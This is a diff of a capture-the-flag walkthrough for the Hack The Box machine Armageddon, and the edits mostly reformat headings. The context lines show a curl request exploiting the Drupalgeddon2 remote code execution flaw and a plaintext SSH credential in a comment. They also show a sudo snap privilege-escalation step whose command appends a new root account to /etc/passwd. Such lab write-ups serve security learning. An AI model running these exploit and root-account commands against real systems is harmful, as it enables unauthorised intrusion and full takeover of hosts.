@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.233 armageddon.htb
+**IP-ADDR:** 10.10.10.233 armageddon.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
@@ -42,9 +42,9 @@ PORT   STATE SERVICE VERSION
 
 ![](screenshots/searchsploit-scan.png)
 
-# Foothold:Drupal_drupalgeddon2
+# Foothold
 
-## Drupal drupalgeddon2 Exploit
+## Drupal property injection: Drupalgeddon 2
 
 * [CVE-2018-7600/SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
   * A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.
@@ -60,13 +60,15 @@ curl -s "http://armageddon.htb/?q=file/ajax/name/%23value/$id" \
 
 ![](screenshots/drupal-exploit.png)
 
-## Exploit Script
+**Exploit Script**
 
 * Drupalgeddon2 Exploit script from [dreadlocked@github](https://github.com/dreadlocked/Drupalgeddon2)
 
 ![](screenshots/web-shell.png)
 
-## Getting user
+Got a restricted shell on the box.
+
+### Execute mysql in non interactive shell
 
 shell is almost completely disconnected and restricted from file system. nothing to do here.
 
@@ -106,7 +108,9 @@ successfully login to ssh with admin creds
 
 ![](screenshots/ssh-login.png)
 
-# Privesc:snap_install_with_sudo
+# Privesc
+
+## `snap install` with sudo
 <!--brucetherealadmin:booboo-->
 
 in the box user "brucetherealadmin" have sudo right to run `/usr/bin/snap` as root with NOPASSWD.
@@ -123,7 +127,7 @@ User brucetherealadmin may run the following commands on armageddon:
 
 Found Exploit on [gtfobins](https://gtfobins.github.io/gtfobins/snap/)
 
-__Create snap package__
+**Create snap package**
 * Generate password hash with command `openssl passwd "Password"`
 ```bash
 COMMAND='echo "toor:VmIEBMKbM9avc:0:0:root/root:/bin/bash" >> /etc/passwd'
